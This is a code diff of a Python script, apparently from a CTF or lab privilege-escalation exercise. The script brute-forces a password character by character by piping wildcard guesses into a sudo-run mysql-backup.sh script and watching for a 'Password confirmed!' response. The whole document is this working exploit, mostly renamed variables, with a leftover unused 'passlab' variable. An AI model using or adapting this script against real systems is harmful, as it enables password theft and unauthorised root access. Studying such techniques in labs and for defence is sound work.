@@ -4,18 +4,18 @@ import subprocess
 pwd = ""
 passlib = list(string.ascii_letters + string.digits)
 
-def guess_password(password, passlib):
+def guess_password(pwd, passlib):
     if not passlib:
-        return password
+        return pwd
 
-    for character in passlib:
-        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
-        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True).stdout
+    for i in passlib:
+        run = f"echo '{pwd}{i}*' | sudo /opt/scripts/mysql-backup.sh"
+        out = subprocess.run(run, shell=True, stdout=subprocess.PIPE, text=True).stdout
 
-        if "Password confirmed!" in output:
-            return guess_password(password + character, passlib)
+        if "Password confirmed!" in out:
+            return guess_password(pwd + i, passlib)
 
-    return password
-all_characters_and_numbers = string.ascii_letters + string.digits
-password = guess_password("", all_characters_and_numbers)
-print(password)
+    return pwd
+passlab = string.ascii_letters + string.digits
+pwd = guess_password("", passlib)
+print(pwd)
